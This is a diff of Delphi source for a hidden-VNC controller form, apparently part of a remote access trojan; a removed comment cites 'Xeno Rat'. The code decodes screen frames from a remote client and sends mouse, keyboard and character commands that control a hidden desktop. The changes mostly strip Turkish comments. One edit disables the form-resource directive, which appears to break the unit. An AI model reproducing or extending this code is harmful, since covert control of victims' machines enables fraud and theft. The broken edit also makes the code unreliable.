@@ -73,7 +73,7 @@ type
     FFocusedHwnd : UInt64;
 
     FPaintBoxActive : Boolean;
-    FCharKeyDown    : set of Byte;   // karakteri hvnc_char ile gönderilen tuşlar
+    FCharKeyDown    : set of Byte;
 
     procedure LogToStatus(const Msg: string);
     procedure UpdateFrameStatus(HeaderFPS: Integer);
@@ -107,15 +107,12 @@ var
 
 implementation
 
-{$R *.dfm}
+{ *.dfm}
 
 const
   HVNC_FRAME_FORMAT_JPEG_FULL  = 1;
   HVNC_FRAME_FORMAT_JPEG_DIRTY = 2;
 
-// -------------------------------------------------------------------------
-//  Yardımcı: Tuşun o anki klavye durumuna göre karakterini döndürür
-// -------------------------------------------------------------------------
 function TForm10.GetCharFromKey(Key: Word; out CharCode: Word): Boolean;
 var
   State: TKeyboardState;
@@ -125,7 +122,6 @@ begin
   Result := False;
   CharCode := 0;
 
-  // Modifier tuşlar asla karakter üretmez
   case Key of
     VK_SHIFT, VK_CONTROL, VK_MENU, VK_LWIN, VK_RWIN,
     VK_CAPITAL, VK_NUMLOCK, VK_SCROLL: Exit;
@@ -142,9 +138,6 @@ begin
   end;
 end;
 
-// -------------------------------------------------------------------------
-//  Constructor / Destructor
-// -------------------------------------------------------------------------
 constructor TForm10.Create(AOwner: TComponent);
 begin
   inherited;
@@ -198,9 +191,6 @@ begin
   inherited;
 end;
 
-// -------------------------------------------------------------------------
-//  Child focus engelleme
-// -------------------------------------------------------------------------
 procedure TForm10.DisableChildFocus;
 var
   I: Integer;
@@ -230,9 +220,6 @@ begin
     ActiveControl := nil;
 end;
 
-// -------------------------------------------------------------------------
-//  Public Setup
-// -------------------------------------------------------------------------
 procedure TForm10.SetupForClient(aLine: TncLine; const ClientID: string;
   ASendJSON: TSendJSONProc; AUnregister: TUnregisterProc);
 begin
@@ -272,9 +259,6 @@ begin
   FUnregister := nil;
 end;
 
-// -------------------------------------------------------------------------
-//  Form Close
-// -------------------------------------------------------------------------
 procedure TForm10.FormClose(Sender: TObject; var Action: TCloseAction);
 begin
   if FIsCapturing then
@@ -286,9 +270,6 @@ begin
   Action := caFree;
 end;
 
-// -------------------------------------------------------------------------
-//  Log ve FPS bilgisi
-// -------------------------------------------------------------------------
 procedure TForm10.LogToStatus(const Msg: string);
 begin
   if not Assigned(StatusBar1) then Exit;
@@ -325,9 +306,6 @@ begin
   FFPSLastTick := NowTick;
 end;
 
-// -------------------------------------------------------------------------
-//  Frame kuyruğu ve JPEG decode (arka planda)
-// -------------------------------------------------------------------------
 procedure TForm10.QueueFrameBytes(const Bytes: TBytes; FrameWidth: Integer;
   FrameHeight: Integer; FrameFormat: Integer; DirtyX: Integer; DirtyY: Integer;
   DirtyW: Integer; DirtyH: Integer; FPS: Integer);
@@ -456,9 +434,6 @@ begin
     end).Start;
 end;
 
-// -------------------------------------------------------------------------
-//  JSON kontrol komutu gönder
-// -------------------------------------------------------------------------
 procedure TForm10.SendControlCommand(const Action: string;
   X, Y, Button, KeyCode: Integer; InjectFocus: Boolean; const Text: string);
 var
@@ -493,9 +468,6 @@ begin
   end;
 end;
 
-// -------------------------------------------------------------------------
-//  Buton tıklamaları
-// -------------------------------------------------------------------------
 procedure TForm10.Button1Click(Sender: TObject);
 var
   JSONObj    : TJSONObject;
@@ -593,9 +565,6 @@ begin
   SetFocus;
 end;
 
-// -------------------------------------------------------------------------
-//  ComboBox kalite değişimi
-// -------------------------------------------------------------------------
 procedure TForm10.ComboBox1Change(Sender: TObject);
 var
   JSONObj    : TJSONObject;
@@ -621,9 +590,6 @@ begin
   SetFocus;
 end;
 
-// -------------------------------------------------------------------------
-//  JSON mesaj işleme (yanıtlar)
-// -------------------------------------------------------------------------
 procedure TForm10.HandleHVNCJSON(JSONObj: TJSONObject);
 var
   Action   : string;
@@ -677,9 +643,6 @@ begin
   end;
 end;
 
-// -------------------------------------------------------------------------
-//  PaintBox boyama
-// -------------------------------------------------------------------------
 procedure TForm10.PaintBox1Paint(Sender: TObject);
 begin
   FBitmapLock.Enter;
@@ -691,9 +654,6 @@ begin
   end;
 end;
 
-// -------------------------------------------------------------------------
-//  Mouse olayları
-// -------------------------------------------------------------------------
 procedure TForm10.PaintBox1MouseDown(Sender: TObject; Button: TMouseButton;
   Shift: TShiftState; X, Y: Integer);
 var
@@ -734,11 +694,6 @@ begin
   SendControlCommand('hvnc_mouseup', X, Y, BtnIdx, -1, False);
 end;
 
-// -------------------------------------------------------------------------
-//  Yeni Klavye İşleyicileri (Xeno Rat stili)
-//  - Karakter üreten tuşlarda yalnızca hvnc_char gönderilir
-//  - Modifier tuşlar normal keydown/keyup iletilir
-// -------------------------------------------------------------------------
 procedure TForm10.FormKeyDown(Sender: TObject; var Key: Word;
   Shift: TShiftState);
 var
@@ -749,7 +704,6 @@ begin
 
   OriginalKey := Key;
 
-  // Intercept Ctrl+A/C/X/V
   if (ssCtrl in Shift) and not (ssAlt in Shift) then
   begin
     case OriginalKey of
@@ -780,13 +734,11 @@ begin
     end;
   end;
 
-  // Enter / Space'in UI butonunu tetiklemesini engelle
   if (Key = VK_RETURN) or (Key = VK_SPACE) then
     Key := 0;
 
   if GetCharFromKey(OriginalKey, CharCode) then
   begin
-    // Yalnızca yazdırılabilir karakterleri (boşluk dahil >= 32) hvnc_char gönder
     if CharCode >= 32 then
     begin
       SendControlCommand('hvnc_char', -1, -1, -1, CharCode, True);
@@ -794,13 +746,11 @@ begin
     end
     else
     begin
-      // Enter, Tab gibi kontrol karakterlerini normal tuş olarak gönder
       SendControlCommand('hvnc_keydown', -1, -1, -1, OriginalKey, True);
     end;
   end
   else
   begin
-    // Ok tuşları, F1-F12, Shift, Ctrl, Alt vb.
     SendControlCommand('hvnc_keydown', -1, -1, -1, OriginalKey, True);
   end;
 end;
@@ -808,7 +758,6 @@ end;
 procedure TForm10.FormKeyUp(Sender: TObject; var Key: Word;
   Shift: TShiftState);
 begin
-  // Suppress KeyUp for shortcuts to avoid interference with client-side injection
   if (ssCtrl in Shift) then
   begin
     case Key of
@@ -819,6 +768,9 @@ begin
       end;
     end;
   end;
+
+  if not FPaintBoxActive then Exit;
+
   if Key in FCharKeyDown then
   begin
     Exclude(FCharKeyDown, Key);
@@ -830,7 +782,6 @@ end;
 
 procedure TForm10.FormKeyPress(Sender: TObject; var Key: Char);
 begin
-  // Artık kullanılmıyor; karakter işleme FormKeyDown'a taşındı
 end;
 
 end.
